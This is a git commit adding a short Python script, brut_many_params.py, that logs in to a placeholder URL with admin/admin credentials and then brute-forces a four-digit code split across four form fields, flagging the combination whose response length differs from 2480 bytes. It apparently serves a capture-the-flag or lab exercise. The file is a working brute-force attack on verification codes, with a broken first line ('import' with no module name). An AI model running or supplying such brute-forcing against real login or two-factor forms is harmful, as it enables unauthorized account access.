a9a394709544a2f658191192a8637589336632cd
iwakura <96665435+m2xq@users.noreply.github.com>
2025-08-16 15:52:40 +0300

    Create brut_many_params.py

---
+++ brut_many_params.py
@@ -0,0 +1,18 @@
+import 
+
+url = "URL"
+s = requests.Session()
+data = {"username": "admin", "password": "admin"} #for example
+login_response = s.post(url, data=data)
+print(login_response.text)
+ 
+for x1 in range (0, 10):
+    for x2 in range (0, 10):
+        for x3 in range (0, 10):
+            for x4 in range (0,10):
+                data_code = {"num1":x1, "num2":x2, "num3":x3, "num4":x4}
+                answer = s.post(url, data=data_code)
+                print(x1, x2, x3, x4)
+                print(len(answer.content))
+                if len(answer.content) != 2480: #check response conditions
+                    print("STOOOOP", x1, x2, x3, x4)
